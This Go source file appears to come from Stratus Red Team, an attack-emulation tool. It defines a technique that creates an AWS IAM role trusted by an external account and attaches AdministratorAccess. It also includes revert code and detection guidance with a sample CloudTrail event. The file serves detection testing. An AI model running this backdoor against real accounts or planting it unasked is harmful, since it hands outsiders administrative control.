package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
)

//go:embed malicious_policy.json
var maliciousIamPolicy string

var roleName string = "stratus-red-team-malicious-iam-role"
var adminPolicyArn string = "arn:aws:iam::aws:policy/AdministratorAccess"

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.iam-create-backdoor-role",
		FriendlyName: "Create a backdoored IAM Role",
		Description: `
Establishes persistence by creating a new backdoor role with a trust policy allowing it to be assumed from 
an external, fictitious attack AWS account.

Warm-up: None.

Detonation: 

- Create a new IAM role with the following trust policy:

` + codeBlock + `json
` + maliciousIamPolicy + `
` + codeBlock + `

- Attach the 'AdministratorAccess' managed IAM policy to it. 

References:

- https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me
`,
		Detection: `
- Through [IAM Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-iam-role), 
which generates a finding when a role can be assumed from a new AWS account or publicly.

- Identify a call to <code>CreateRole</code> closely followed by <code>AttachRolePolicy</code> with an administrator policy.

- Identify a call to <code>CreateRole</code> that contains an assumeRolePolicyDocument in the requestParameters that allows access from an external AWS account. Sample event:

` + codeBlock + `
{
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateRole",
  "requestParameters": {
	"roleName": "malicious-iam-role",
	"assumeRolePolicyDocument": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"Service\": \"ec2.amazonaws.com\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}"
   }
}
` + codeBlock + `
`,
		Platform:           stratus.AWS,
		IsIdempotent:       false, // cannot create twice a role with the same name
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Persistence},
		Detonate:           detonate,
		Revert:             revert,
	})
}

func detonate(_ map[string]string, providers stratus.CloudProviders) error {
	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Creating a malicious IAM role")
	input := &iam.CreateRoleInput{
		RoleName:                 &roleName,
		AssumeRolePolicyDocument: &maliciousIamPolicy,
	}

	_, err := iamClient.CreateRole(context.Background(), input)
	if err != nil {
		return errors.New("Unable to create IAM role: " + err.Error())
	}

	log.Println("IAM role created: " + roleName)

	attachPolicyInput := &iam.AttachRolePolicyInput{
		RoleName:  &roleName,
		PolicyArn: &adminPolicyArn,
	}

	_, err = iamClient.AttachRolePolicy(context.Background(), attachPolicyInput)
	if err != nil {
		log.Fatalf("Unable to attach AdministratorAccess policy to IAM role: %v", err)
	}

	log.Println("AdministratorAccess policy attached successfully")
	return nil
}

func revert(_ map[string]string, providers stratus.CloudProviders) error {
	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())
	detachPolicyInput := &iam.DetachRolePolicyInput{
		RoleName:  &roleName,
		PolicyArn: &adminPolicyArn,
	}
	_, err := iamClient.DetachRolePolicy(context.Background(), detachPolicyInput)
	if err != nil {
		return errors.New("Unable to detach policy from IAM role: " + err.Error())
	}
	log.Println("Policy detached from IAM role: " + roleName)
	log.Println("Deleting IAM role " + roleName)
	input := &iam.DeleteRoleInput{
		RoleName: &roleName,
	}
	_, err = iamClient.DeleteRole(context.Background(), input)
	if err != nil {
		return errors.New("Unable to delete IAM role: " + err.Error())
	}

	log.Println("IAM role deleted: " + roleName)
	return nil
}
